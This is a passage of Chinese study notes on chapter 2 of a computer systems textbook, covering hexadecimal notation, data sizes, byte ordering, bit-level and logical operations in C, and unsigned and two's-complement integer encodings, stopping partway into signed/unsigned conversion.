<p>在核心部分，我们需要方法来<strong>表示</strong>基本数据类型，比如整数和实数运算的近似值。</p>
<p>然后，我们考虑<strong>机器级指令</strong>如何操作这样的数据，以及编译器又如何将C程序翻译成这样的指令。</p>
<p>接下来，研究几种实现<strong>处理器</strong>的方法，帮助我们更好地了解硬件资源如何被用来执行指令。</p>
<p>一旦理解了编译器和机器级代码，我们就能了解如何通过编写C程序以及编译它们来<strong>最大化</strong>程序的性能。</p>
<p>本部分以存储器子系统的设计作为结束，这是现代计算机系统最复杂的部分之一。</p>
<p>本书的这一部分将领着你深入了解如何表示和执行应用程序。你将学会一些技巧，来帮助你写出安全、可靠且充分利用计算资源的程序。</p>
<h1 id="Chapter-2-Representing-and-Manipulating-Information"><a href="#Chapter-2-Representing-and-Manipulating-Information" class="headerlink" title="Chapter 2: Representing and Manipulating Information"></a>Chapter 2: Representing and Manipulating Information</h1><blockquote>
<p>第2章：信息的表示和处理。我们讲述了计算机的<strong>算术运算</strong>，重点描述了会对程序员有影响的<strong>无符号数</strong>和<strong>数的补码</strong>表示的特性。我们考虑数字是如何表示的，以及由此确定对于一个给定的字长，其可能编码值的范围。我们探讨有符号和无符号数字之间类型转换的效果，还阐述算术运算的数学特性。菜鸟级程序员经常很惊奇地了解到（用补码表示的）两个正数的和或者积可能为负。另一方面，补码的算术运算满足很多整数运算的代数特性，因此，编译器可以很安全地把一个<strong>常量乘法</strong>转化为一系列的<strong>移位</strong>和<strong>加法</strong>。我们用C语言的<strong>位级操作</strong>来说明布尔代数的原理和应用。我们从两个方面讲述了IEEE标准的浮点格式：一是如何用它来<strong>表示数值</strong>，一是浮点运算的<strong>数学属性</strong>。</p>
<p>对计算机的算术运算有深刻的理解是写出可靠程序的关键。比如，程序员和编译器不能用表达式<code>(x - y &lt; 0)</code>来替代<code>(x &lt; y)</code>, 因为前者可能会产生溢出。甚至也不能用表达式<code>(-y &lt; -x)</code>来替代，因为在补码表示中负数和正数的范围是不对称的。<strong>算术溢出</strong>是造成程序错误和安全漏洞的一个常见根源，然而很少有书从程序员的角度来讲述计算机算术运算的特性。</p>
</blockquote>
<ol>
<li><p>现代计算机存储和处理的信息以<strong>二值信号</strong>表示。</p>
</li>
<li><p>二进制数字，也被称为<strong>位（bit）</strong>，形成了数字革命的基础。</p>
</li>
<li><p>二进制能较好地存储和处理信息，因为它能够很容易地被表示、存储和传输，而且对二值信号进行存储和执行计算的电子电路非常简单和可靠。例如可以表示为穿孔卡片上有洞或无洞、导线上的高电压或低电压，或者顺时针或逆时针的磁场。</p>
</li>
<li><p>孤立的单个的位不是非常有用，但是当把位组合在一起，再加上某种<strong>解释（interpretation）</strong>，即赋予不同的可能位模式以含意，我们就能够表示任何有限集合的元素。这就是编码。</p>
</li>
<li><p>我们将研究三种最重要的数字表示：</p>
<ul>
<li><strong>无符号（unsigned）</strong>编码基于传统的二进制表示法，表示大于或者等于零的数字；</li>
<li><strong>补码（two’s-complement）</strong>编码是表示<strong>有符号</strong>整数的最常见的方式；</li>
<li><strong>浮点数（floating-point）</strong>编码是表示实数的科学计数法的以2为基数的版本。</li>
</ul>
<p>计算机用这些不同的表示方法实现算数运算，例如加法和乘法，类似于对应的整数和实数运算。</p>
</li>
<li><p>计算机的表示法是用<strong>有限</strong>数量的位来对一个数字编码，因此可能会因为结果太大而<strong>溢出（overflow）</strong>。</p>
</li>
<li><p>特别要注意<strong>浮点运算</strong>，它有完全不同的数学属性。溢出会产生特殊的值+∞。而且由于表示的精度有限，浮点运算是不可结合的。例如，大多数机器上的C表达式<code>(3.14 + 1e20) - 1e20</code>求得的值会是<code>0.0</code>，而<code>3.14 + (1e20 - 1e20)</code>求得的值会是<code>3.14</code>。</p>
</li>
<li><p>之所以浮点运算和整数运算会有不同的数学属性，是因为它们处理数字表示<strong>有限性</strong>的方式不同：</p>
<ul>
<li>整数的表示虽然只能编码一个相对<strong>较小的数值范围</strong>，但是这种表示是<strong>精确</strong>的；</li>
<li>浮点数虽然可以编码一个<strong>较大的数值范围</strong>，但是这种表示是<strong>近似</strong>的。</li>
</ul>
</li>
<li><p>为了使编写的程序能在<strong>全部数值范围内</strong>正确工作，而且具有可以跨越不同机器、操作系统和编译器组合的<strong>可移植性</strong>，了解数字的实际表示是非常重要的。</p>
</li>
<li><p>大量计算机的安全漏洞都是由于计算机算数运算的微妙细节引发的。</p>
</li>
<li><p>GNU编译器套装（GNU Complier Collection，GCC）可以基于不同的命令行选项，依照多个不同版本的C语言规则来编译程序，如下表所示。</p>
<table>
<thead>
<tr>
<th align="center">C版本</th>
<th align="center">GCC命令行选项</th>
</tr>
</thead>
<tbody><tr>
<td align="center">GNU 89</td>
<td align="center">无，<code>-std=gnu89</code></td>
</tr>
<tr>
<td align="center">ANSI, ISO C90</td>
<td align="center"><code>-ansi</code>, <code>-std=c89</code></td>
</tr>
<tr>
<td align="center">ISO C99</td>
<td align="center"><code>-std=c99</code></td>
</tr>
<tr>
<td align="center">ISO C11</td>
<td align="center"><code>-std=c11</code></td>
</tr>
</tbody></table>
<p>比如，根据ISO C11来编译程序<code>prog.c</code>，我们可以使用命令行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -std=c11 prog.c</span></span><br></pre></td></tr></table></figure>
<p>C语言各版本的区别如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/summary-c-all-versions_thumb.png" alt="summary-c-all-versions_thumb"></p>
</li>
</ol>
<h2 id="2-1-Information-Storage"><a href="#2-1-Information-Storage" class="headerlink" title="2.1 Information Storage"></a>2.1 Information Storage</h2><p>信息存储。</p>
<ol>
<li>大多数计算机使用8位的块（<strong>字节，byte</strong>）作为<strong>最小的</strong>可寻址的内存单位，而不是访问内存中单独的位。</li>
<li>机器级程序将内存视为一个非常大的<strong>字节数组</strong>，称为<strong>虚拟内存（virtual memory）</strong>，内存的每个<strong>字节</strong>都由一个唯一的数字来标识，称为它的<strong>地址（address）</strong>，所有可能地址的集合就称为<strong>虚拟地址空间（virtual address space）</strong>。</li>
<li>虚拟地址空间只是一个展现给机器级程序的<strong>概念性映像</strong>，实际的实现是将动态随机访问存储器（DRAM）、闪存、磁盘存储器、特殊硬件和操作系统软件结合起来，为程序提供一个<strong>看上去统一的字节数组</strong>。</li>
<li>编译器和运行时系统将存储器空间<strong>划分为更可管理的单元</strong>，来存放不同的<strong>程序对象（program object）</strong>，即<strong>程序数据</strong>、<strong>指令</strong>和<strong>控制信息</strong>。</li>
<li>可以用各种机制来分配和管理程序不同部分的存储，这种管理完全是在虚拟地址空间里完成的。</li>
<li>C指针存储某个存储块的第一个字节的虚拟地址，无论指针指向一个整数、一个结构或是某个其他程序对象。</li>
<li>C编译器会把每个指针和<strong>类型</strong>信息联系起来，以根据指针类型而生成不同的机器级代码来访问指针指向位置存储的值。（生成的机器级程序不包含类型信息）</li>
<li>每个程序对象可以简单地视为一个字节块，而程序本身就是一个字节序列。</li>
</ol>
<h3 id="2-1-1-Hexadecimal-Notation"><a href="#2-1-1-Hexadecimal-Notation" class="headerlink" title="2.1.1 Hexadecimal Notation"></a>2.1.1 Hexadecimal Notation</h3><p>十六进制表示法：</p>
<ol>
<li>一个字节的值域是$00000000_{2}$～$11111111_{2}$，即$0_{10}$～$255_{10}$。可以看出，二进制表示法太冗长，而由于10不是2的幂次导致十进制表示法与位模式的互相转化很麻烦。</li>
<li>替代以上两种方法，以16为基数，或称<strong>十六进制（hexadecimal，hex）</strong>数，来表示位模式——使用数字0～9以及字符’A’～’F’来表示16个可能的值。每1个hex位对应4个二进制位，$A_{16}=10_{10}$、$C_{16}=12_{10}$、$F_{16}=15_{10}$。用十六进制书写，一个字节的值域为$00_{16}$～$FF_{16}$。</li>
<li>在C语言中，以0x或0X开头的数字常量被认为是十六进制的值，字符’A’～’F’可以大写，也可以小写，甚至大小写混合。</li>
<li>特别地，当x是2的非负整数次幂时，即$x=2^{n}(n\geq 0)$，则x的二进制表示就是1后面跟n个0。每4个二进制0对应一个十六进制0，前面$0001_{2}=1_{16}$、$0010_{2}=2_{16}$、$0100_{2}=4_{16}$、$1000_{2}=8_{16}$。</li>
</ol>
<h3 id="2-1-2-Data-Sizes"><a href="#2-1-2-Data-Sizes" class="headerlink" title="2.1.2 Data Sizes"></a>2.1.2 Data Sizes</h3><p>字数据大小。</p>
<ol>
<li><p>计算机的<strong>字长（word size）</strong>指明指针数据的标称大小（nominal size）。虚拟地址是以字来编码的，所以字长决定的最重要的系统参数就是<strong>虚拟地址空间的最大大小</strong>。</p>
<p>对一个字长为$w$的机器而言，虚拟地址的范围为$0$～$2^{w}-1$，程序最多访问$2^{w}$个字节。</p>
</li>
<li><p>32位字长限制虚拟地址空间为4千兆字节（写作4GB），刚刚超过$4\times 10^{9}$字节。扩展到64位字长使得虚拟地址空间为16EB，大约是$1.84\times 10^{19}$字节。</p>
</li>
<li><p>大多数64位机器也可以运行32位程序（向后兼容）。若程序<code>prog.c</code>用如下伪指令编译后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -m32 prog.c</span></span><br></pre></td></tr></table></figure>
<p>可以在32位或64位机器上正确运行；而用下述伪指令编译后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> gcc -m64 prog.c</span></span><br></pre></td></tr></table></figure>
<p>只能在64位机器上运行。</p>
<p>因此，我们将程序称为“32位程序”或“64位程序”，区别在于该程序是如何编译的，而不是其运行的机器类型。</p>
</li>
<li><p>下图是基本C数据类型的典型大小（以字节为单位）。分配的字节数受程序是如何编译的影响而变化，本图给出的是32位和64位程序的典型值。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%A4%A7%E5%B0%8F.png" alt="数据类型大小"></p>
<p>C数据类型<code>char</code>表示一个单独的字节，尽管“<code>char</code>”是由于它被用来存储文本串中的单个字符这一事实而得名，但也能被用来存储整数值。</p>
<p>为避免字节数在不同编译器设置下的改变，ISO C99引入一类数据大小固定的数据类型，包括<code>int32_t</code>和<code>int64_t</code>，分别为4字节和8字节。使用确定大小的整数类型是程序员准确控制数据表示的最佳途径。</p>
</li>
<li><p>大部分数据类型默认均为有符号，除非有前缀关键字<code>unsigned</code>。数据类型<code>char</code>例外，尽管大多数编译器和机器将它们视为有符号数，但C标准不保证这一点。所以应该用有符号字符的声明来保证其为一个字节的有符号数值（不过程序行为对<code>char</code>是否有符号并不敏感）。</p>
</li>
<li><p><code>unsigned long</code>、<code>unsigned long int</code>、<code>long unsigned</code>、<code>long unsigned int</code>都是一个意思。</p>
</li>
<li><p>程序可移植性的一个方面就是使程序对不同数据类型的确切大小不敏感。C语言标准对不同数据类型的数字范围设置了下界，但是却没有上界。</p>
</li>
</ol>
<h3 id="2-1-3-Addressing-and-Byte-Ordering"><a href="#2-1-3-Addressing-and-Byte-Ordering" class="headerlink" title="2.1.3 Addressing and Byte Ordering"></a>2.1.3 Addressing and Byte Ordering</h3><p>寻址和字节顺序。</p>
<ol>
<li><p>如果一个程序对象超过1字节，即跨越了多个字节，就应该规定这个对象内存中的排列方式及其地址——在几乎所有的机器上，多字节对象都被存储为<strong>连续的</strong>字节序列，对象的地址为<strong>所使用字节中最小的地址</strong>。</p>
<p>假设<code>int</code>型变量<code>x</code>地址为0x100，即地址表达式<code>&amp;x</code>的值为0x100。<code>x</code>的4个字节将被存储在内存的0x100、0x101、0x102和0x103位置。</p>
</li>
<li><p>假设一个整数有$w$位，$x_{w-1}$为最高有效位，$x_{0}$为最低有效位。若$w$是8的倍数，则这些位每8位一组便分成字节，最高有效字节为$x_{w-1}$～$x_{w-8}$，最低有效字节为$x_{7}$～$x_{0}$。</p>
<ul>
<li>某些机器选择在内存中按照从<strong>最低有效字节</strong>到<strong>最高有效字节</strong>的顺序存储对象，称为<strong>小端法（little endian）</strong>（最低有效字节在最前面）；</li>
<li>另一些机器则按照从<strong>最高有效字节</strong>到<strong>最低有效字节</strong>的顺序存储，称为<strong>大端法（big endian）</strong>（最高有效字节在最前面）。</li>
</ul>
<p>假设<code>int</code>型变量<code>x</code>位于地址0x100处，它的hex值为0x01234567，则在内存中存储方式有以下两种：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%A4%A7%E5%B0%8F%E7%AB%AF.png" alt="大小端"></p>
</li>
<li><table>
<thead>
<tr>
<th>Little endian</th>
<th>Big endian</th>
<th>Bi-endian</th>
</tr>
</thead>
<tbody><tr>
<td>大多数Inter兼容机</td>
<td>IBM和Oracle的大多数机器</td>
<td>IBM和Oracle制造的比较新的微处理器</td>
</tr>
<tr>
<td>IBM和Oracle制造的个人计算机（使用Inter兼容的处理器）</td>
<td></td>
<td>许多用于移动电话的ARM微处理器</td>
</tr>
<tr>
<td>Android（来自Google）和iOS（来自Apple）</td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p>虽然字节顺序不可见，编译出的程序结果也相同，但有时字节顺序也会成问题：</p>
<ul>
<li><p>不同类型的机器间通过网络传送二进制数据时，若小端法机器产生的数据被发送到大端法机器或反之，接收程序时会发现字节成了反序的。</p>
<p>为避免这类问题，须遵守已建立的关于字节顺序的规则。</p>
</li>
<li><p>当阅读表示整数数据的字节序列时字节顺序也很重要。</p>
</li>
<li><p>当编写规避正常的类型系统的程序时。C中可以通过使用<strong>强制类型转换（cast）</strong>或<strong>联合（union）</strong>来允许一种数据类型引用一个对象，而这种数据类型与创建这个对象时定义的数据类型不同。</p>
</li>
</ul>
</li>
<li><p>C格式化指令<code>&quot;%.2x&quot;</code>表明整数必须用至少两个数字的十六进制格式输出。</p>
</li>
</ol>
<h3 id="2-1-4-Representing-Strings"><a href="#2-1-4-Representing-Strings" class="headerlink" title="2.1.4 Representing Strings"></a>2.1.4 Representing Strings</h3><p>表示字符串：</p>
<ol>
<li><p>C语言中字符串被编码为一个以null（其值为0）字符结尾的字符数组。每个字符都由某个标准编码来表示，最常见的就是ASCII字符码。</p>
</li>
<li><p>在使用ASCII码作为字符码的任何系统上都将得到相同的结果，与字节顺序和字大小无关。因而，文本数据比二进制数据具有更强的<strong>平台独立性</strong>。</p>
</li>
<li><p>字符<code>&#39;a&#39;</code>～<code>&#39;z&#39;</code>的ASCII码为0x61～0x7A。</p>
</li>
<li><p>ASCII字符集适合于编码英语文档，不适合表达一些特殊字符，完全不适合编码希腊语、俄语和中文等语言的文档。Unicode联合会（Unicode Consortium）修订了最全面且广泛接受的文字编码标准，其基本编码称为Unicode的“统一字符集”，使用32位来表示字符。常见字符只需要1个或2个字节，不常用字符需要更多字节。</p>
<p>特别地，UTF-8表示将每个字符编码为一个字节序列，ASCII字符使用其在ASCII中一样的单字节编码。</p>
<p>Java使用Unicode表示字符串，对于C也有支持Unicode的程序库。</p>
</li>
</ol>
<h3 id="2-1-5-Representing-Code"><a href="#2-1-5-Representing-Code" class="headerlink" title="2.1.5 Representing Code"></a>2.1.5 Representing Code</h3><p>表示代码：</p>
<ol>
<li>不同的机器类型、不同的操作系统使用不同的且不兼容的指令和编码方式（即使进程完全一样），因此二进制代码是不兼容的。二进制代码很少能在不同机器和操作系统组合之间移植。</li>
<li>计算机系统的一个基本概念就是，从机器的角度来看，程序仅仅只是字节序列。机器没有关于原始源程序的任何信息，除了可能有些用来帮助调试的辅助表以外。</li>
</ol>
<h3 id="2-1-6-Introduction-to-Boolean-Algebra"><a href="#2-1-6-Introduction-to-Boolean-Algebra" class="headerlink" title="2.1.6 Introduction to Boolean Algebra"></a>2.1.6 Introduction to Boolean Algebra</h3><p>布尔代数简介。</p>
<ol>
<li><p>二进制值是计算机编码、存储和操作信息的核心，所以围绕数值0和1的研究已经演化出了丰富的数学知识体系——这起源于1850年前后乔治·布尔（George Boole，1815—1864）的工作，因此也被称为<strong>布尔代数（Boolean algebra）</strong>。后来创立信息论领域的Claude Shannon（1916—2001）首先建立了布尔代数和数字逻辑之间的联系。</p>
</li>
<li><p>下图列举了几种布尔代数的运算，二进制值1和0表示逻辑值<code>TRUE</code>或者<code>FALSE</code>，运算符<code>~</code>、<code>&amp;</code>、<code>|</code>和<code>^</code>分别表示逻辑运算NOT、AND、OR、和EXCLUSIVE-OR。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%B8%83%E5%B0%94%E4%BB%A3%E6%95%B0%E8%BF%90%E7%AE%97.png" alt="布尔代数运算"></p>
<p>我们可以将上述4个布尔运算扩展到<strong>位向量</strong>的运算，位向量就是固定长度为w、由0和1组成的串。位向量的运算可以定义成参数的每个对应元素之间的运算。</p>
</li>
<li><p>当考虑长度为w的位向量上的<code>^</code>、<code>&amp;</code>和<code>~</code>运算时，会得到一种不同的数学形式，称为<strong>布尔环（Boolean ring）</strong>。</p>
<p>布尔环与整数运算有很多相同属性，如整数运算中每个值<code>x</code>都有一个加法逆元（additive inverse）<code>-x</code>，使得<code>x+(-x)=0</code>。布尔环也有类似的属性，这里的“加法”运算是<code>^</code>，每个元素的加法逆元是它自身——也就是说，对任何值<code>a</code>来说，<code>a^a=0</code>（用<code>0</code>来表示全0的位向量）。当我们重新排列组合顺序，这个属性也仍然成立，因此有<code>(a^b)^a=b</code>。这个属性会引起一些很有趣的结果和聪明的技巧。</p>
</li>
<li><p>位向量一个很有用的应用就是表示有限集合。我们可以用位向量[$a_{w-1}, …, a_{1}, a_{0}$]编码任何子集A⊆{0, 1, …, w-1}，其中$a_{i}=1$当且仅当i⊆A。例如位向量a=[01101001]表示集合 A={0, 3, 5, 6}，而b=[01010101]表示集合B={0, 2, 4, 6}。使用这种编码集合的方法，布尔运算<code>|</code>和<code>&amp;</code>分别对应于集合的并和交，而<code>~</code>对应于集合的补。还是用前面那个例子，运算<code>a&amp;b</code>得到位向量[01000001]，而 A∩B={0, 6}。</p>
</li>
<li><p>我们还能够通过指定一个位向量<strong>掩码</strong>，有选择地enable或是屏蔽（disable）一些<strong>信号</strong>，其中某一位位置上为1时，表明信号 是有效的（enable），而0表明该信号是被屏蔽（disable）的。因而，这个掩码表示的就是设置为有效信号的集合。</p>
</li>
</ol>
<h3 id="2-1-7-Bit-Level-Operations-in-C"><a href="#2-1-7-Bit-Level-Operations-in-C" class="headerlink" title="2.1.7 Bit-Level Operations in C"></a>2.1.7 Bit-Level Operations in C</h3><p>C语言中的<strong>位级运算</strong>：</p>
<ol>
<li><p>交换指针变量<code>x</code>和<code>y</code>所指向的存储位置处存放的值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inplace_swap</span><span class="params">(<span class="keyword">int</span> *x, <span class="keyword">int</span> *y)</span> </span>&#123;</span><br><span class="line">  *y = *x ^ *y; <span class="comment">/* Step 1 */</span></span><br><span class="line">  *x = *x ^ *y; <span class="comment">/* Step 2 */</span></span><br><span class="line">  *y = *x ^ *y; <span class="comment">/* Step 3 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不需要第三个位置来临时存储另一个值，但这种交换方式并没有性能上的优化，仅仅是一个智力游戏。（每个元素就是它自身的加法逆元（<code>a^a=0</code>））</p>
</li>
<li><p>位级运算的一个常见应用就是实现<strong>掩码</strong>运算，比如取<code>x=0x89ABCDEF</code>的最低有效字节：<code>x &amp; 0xFF = 0x000000EF</code>；表达式<code>~0</code>将生成一个全1的掩码，与字长无关，相比之下，0xFFFFFFFF只能工作在32位机器上，是不可移植的。</p>
</li>
<li><p><code>|0</code>使位不变，<code>|1</code>使位全1；<code>&amp;0</code>使位全0，<code>&amp;1</code>使位不变；<code>^0</code>使位不变，<code>^1</code>使位取反。</p>
</li>
</ol>
<h3 id="2-1-8-Logical-Operations-in-C"><a href="#2-1-8-Logical-Operations-in-C" class="headerlink" title="2.1.8 Logical Operations in C"></a>2.1.8 Logical Operations in C</h3><p>C语言中的<strong>逻辑运算</strong>（有别于位级运算）：</p>
<ol>
<li>逻辑运算符：<code>||</code>、<code>&amp;&amp;</code>和<code>!</code>。</li>
<li>逻辑运算<code>&amp;&amp;</code>和<code>||</code>与位级运算<code>&amp;</code>和<code>|</code>的重要区别是，如果对第一个参数求值就能确定表达式的结果，那么逻辑运算就不会对第二个参数求值。如<code>a&amp;&amp;5/a</code>不会造成零除，<code>p&amp;&amp;*p++</code>不会导致间接引用空指针。</li>
</ol>
<h3 id="2-1-9-Shift-Operations-in-C"><a href="#2-1-9-Shift-Operations-in-C" class="headerlink" title="2.1.9 Shift Operations in C"></a>2.1.9 Shift Operations in C</h3><p>C语言中的移位运算：</p>
<ol>
<li><p><code>x&lt;&lt;k</code>：<code>x</code>左移<code>k</code>位，丢弃最高的<code>k</code>位，并在右端补<code>k</code>个0。移位运算是从左至右可结合的，即<code>x&lt;&lt;j&lt;&lt;k</code>等价于<code>(x&lt;&lt;j)&lt;&lt;k</code>。</p>
</li>
<li><p><code>x&gt;&gt;k</code>：分为两种形式，<strong>逻辑右移</strong>和<strong>算术右移</strong>：</p>
<ul>
<li>逻辑右移在左端补<code>k</code>个0；</li>
<li>算术右移在左端补<code>k</code>个最高有效位的值（看上去有些奇特，但对有符号整数数据的运算非常有用）。</li>
</ul>
</li>
<li><p>C语言标准并没有明确定义对于有符号数应该使用哪种类型的右移，由此造成了可移植性问题。实际上，<strong>几乎所有</strong>的编译器/机器组合都<strong>对有符号数使用算术右移</strong>，另一方面，<strong>对于无符号数，右移必须是逻辑的</strong>。</p>
<p>与C相比，Java对于如何进行右移有明确的定义。表达式<code>x&gt;&gt;k</code>为算术右移；<code>x&gt;&gt;&gt;k</code>为逻辑右移。</p>
</li>
<li><p>在许多机器上，当移动一个<code>w</code>位的值时，移位指令只考虑位移量的低$log_{2}w$位，因此实际上位移量就是通过计算<code>k mod w</code>得到的。</p>
<p>不过这种行为对于C程序来说是<strong>没有保证的</strong>，所以应该保持位移量小于待移位值的位数。另一方面，Java特别要求位移数量应该按照我们前面所讲的求模的方法来计算。</p>
</li>
<li><p>C语言中加减法的优先级高于移位运算，所以请加括号。</p>
</li>
</ol>
<h2 id="2-2-Integer-Representations"><a href="#2-2-Integer-Representations" class="headerlink" title="2.2 Integer Representations"></a>2.2 Integer Representations</h2><p>整数表示。</p>
<p>用位来编码整数有两种不同的方式：</p>
<ul>
<li>一种只能表示非负数；</li>
<li>另一种能够表示负数、零和正数。</li>
</ul>
<p>这两种表示方式在数学属性和机器级实现方面密切相关。下图是一些数学术语，用于精确定义和描述计算机如何编码和操作整数。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%95%B4%E6%95%B0%E6%93%8D%E4%BD%9C.png" alt="整数操作"></p>
<h3 id="2-2-1-Integral-Data-Types"><a href="#2-2-1-Integral-Data-Types" class="headerlink" title="2.2.1 Integral Data Types"></a>2.2.1 Integral Data Types</h3><p>整型数据类型——表示有限范围的整数。</p>
<ol>
<li><p>下面是32位和64位程序上C语言整型数据类型的典型取值范围：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/32%E4%BD%8D%E6%95%B4%E5%9E%8B.png" alt="32位整型"></p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/64%E4%BD%8D%E6%95%B4%E5%9E%8B.png" alt="64位整型"></p>
<p>大多数64位机器使用8个字节的表示，比32位机器上使用的4个字节的表示的取值范围大很多。</p>
</li>
<li><p>下面是C语言的整型数据类型保证的取值范围，C语言标准要求这些数据类型必须至少具有这样的取值范围：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/C%E6%95%B4%E5%9E%8B.png" alt="C整型"></p>
<p>C和C++都支持有符号（默认）和无符号数，Java只支持有符号数。</p>
</li>
</ol>
<h3 id="2-2-2-Unsigned-Encodings"><a href="#2-2-2-Unsigned-Encodings" class="headerlink" title="2.2.2 Unsigned Encodings"></a>2.2.2 Unsigned Encodings</h3><p>无符号数的编码：</p>
<ol>
<li>无符号数的编码就是它的<strong>二进制表示</strong>（$\vec{x}=[x_{w-1}, x_{w-2}, …, x_{0}]$）：$$B2U_{w}(\vec{x})\doteq \sum_{i=0}^{w-1}x_{i}2^{i}$$</li>
<li>函数$B2U_{w}$将一个长度为$w$的0、1串映射到非负整数。</li>
<li>下面是$w=4$的无符号数示例，当二进制表示中位<code>i</code>为1，数值就会加上$2^{i}$：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B0.png" alt="无符号数"></li>
<li>无符号数编码具有唯一性，因为函数$B2U_{w}$是一个双射。</li>
</ol>
<h3 id="2-2-3-Two’s-Complement-Encodings"><a href="#2-2-3-Two’s-Complement-Encodings" class="headerlink" title="2.2.3 Two’s-Complement Encodings"></a>2.2.3 Two’s-Complement Encodings</h3><p>有符号数的编码——补码编码：</p>
<ol>
<li><p>补码编码是将字的最高有效位解释为负权（negative weight）（$\vec{x}=[x_{w-1}, x_{w-2}, …, x_{0}]$）：$$B2T_{w}(\vec{x})\doteq -x_{w-1}2^{w-1}+\sum_{i=0}^{w-2}x_{i}2^{i}$$最高有效位也称为<strong>符号位</strong>，值为1时表示负数，值为0时表示非负。</p>
</li>
<li><p>下面是$w=4$的补码示例，把位3作为符号位，因此当它为1时，对数值的影响是$-2^{3}=-8$：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B0.png" alt="有符号数"></p>
</li>
<li><p>考虑w位补码：</p>
<ul>
<li>当符号位为1，其他位为0时，取到最小值$$TMin_{w}\doteq -2^{w-1}$$</li>
<li>当符号位为0，其他位为1时，取到最大值$$TMax_{w}\doteq \sum_{i=0}^{w-2}2^{i}=2^{w-1}-1$$</li>
</ul>
<p>可以看出函数$B2T_{w}$是一个从长度为w的位模式到$TMin_{w}$和$TMax_{w}$之间数字的映射。</p>
</li>
<li><p>补码编码具有唯一性，因为函数$B2T_{w}$是一个双射。</p>
</li>
<li><p>下面是针对不同字长的几个重要数字的位模式和数值：<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E9%87%8D%E8%A6%81%E6%95%B0%E5%AD%97.png" alt="重要数字"></p>
<ul>
<li>前三个是可表示的整数的范围；</li>
<li>由于0的存在，补码的范围是不对称的：|TMin|=|TMax|+1，即TMin没有与之对应的正数，这导致了补码运算的某些特殊的属性，并且容易造成程序中细微的错误；</li>
<li>最大的无符号数刚好比补码的最大值的两倍大一点：UMax=2TMax+1，补码表示中所有表示负数的位模式在无符号表示中都变成了正数；</li>
<li>-1和UMax有同样的位表示——一个全1的串。</li>
</ul>
</li>
<li><p>C语言并没有要求要用补码形式来表示有符号整数，但是几乎所有的机器都是这么做的。不应该假设除了上图之外的任何可表示的数值范围，也不应该假设有符号数会使用何种特殊的表示方式。C库中的文件<code>&lt;limits.h&gt;</code>定义了一组常量<code>INT_MAX</code>、<code>INT_MIN</code>和<code>UNIT_MAX</code>等，分别描述了有符号和无符号整数的范围。</p>
</li>
<li><p>ISO C99标准在文件<code>stdint.h</code>中引入了更大的整数类型类。它定义了一组数据类型，声明形如<code>intN_t</code>和<code>uintN_t</code>，对不同的N值指定N位有符号整数和无符号整数。N的具体值与 实现相关，但是大多数编译器允许的值为8、16、32和64。即<code>uint16_t</code>为16位无符号变量，<code>int32_t</code>为32位有符号变量。</p>
</li>
<li><p>上述数据类型对应着一组宏，定义了每个N值对应的最小和最大值。这些宏名字形如<code>INTN_MIN</code>、<code>INTN_MAX</code>和<code>UINTN_MAX</code>。确定宽度类型的带格式打印需要使用宏，以与系统相关的方式扩展为格式串，宏<code>PRId32</code>展开成字符串<code>d</code>，宏<code>PRIu64</code>展开成两个字符串<code>l</code>和<code>u</code>。使用宏能保证不论代码如何编译，都能生成正确的格式字符串。</p>
</li>
<li><p>Java标准明确要求采用补码表示整数数据类型，Java中的单字节数据类型称为<code>byte</code>，而不是<code>char</code>。这些非常具体的要求都是为了保证无论在什么机器上运行，Java程序都能表现得完全一样。</p>
</li>
<li><p>有符号数的其他表示方法：</p>
<ul>
<li><strong>反码（Ones’ Complement）</strong>：类似补码，但最高有效位权是$-(2^{w-1}-1)$而不是$-2^{w-1}$：$$B2O_{w}(\vec{x})\doteq -x_{w-1}(2^{w-1}-1)+\sum_{i=0}^{w-2}x_{i}2^{i}$$</li>
<li><strong>原码（Sign-Magnitude）</strong>：最高有效位是符号位，用来确定剩下的位应该取负权还是正权：$$B2S_{w}(\vec{x})\doteq (-1)^{x_{w-1}}\times \sum_{i=0}^{w-2}x_{i}2^{i}$$</li>
</ul>
<p>这两种编码对于数字0有两种不同的编码方式：把[00…0]都解释为+0，而-0在原码中表示为[10…0]，在反码中表示为[11…1]。几乎所有现代机器都使用补码。在浮点数中有使用原码编码。</p>
<p>对于非负数x，我们用$2^{w}-x$来计算-x的w位表示，用[111…1]-x来计算-x的反码表示。前者只有一个2，后者有很多个1，这就是“Two’s complement”和“Ones’ complement”的来源。</p>
</li>
<li><p>汇编文件中包含的十六进制数字都是用典型的补码形式表示的。</p>
</li>
</ol>
<h3 id="2-2-4-Conversions-between-Signed-and-Unsigned"><a href="#2-2-4-Conversions-between-Signed-and-Unsigned" class="headerlink" title="2.2.4 Conversions between Signed and Unsigned"></a>2.2.4 Conversions between Signed and Unsigned</h3><p>有符号数和无符号数之间的转换：</p>
<ol>
<li><p>对于大多数C语言的实现，处理同样字长的有符号数和无符号数之间相互转换的一般规则是：数值可能会改变（编码方式改变），但是<strong>位模式不变</strong>。</p>
</li>
<li><p>数值是如何改变的（有符号数到无符号数，x满足$TMIn_{w}\le x\le TMax_{w}）$：</p>
<ul>
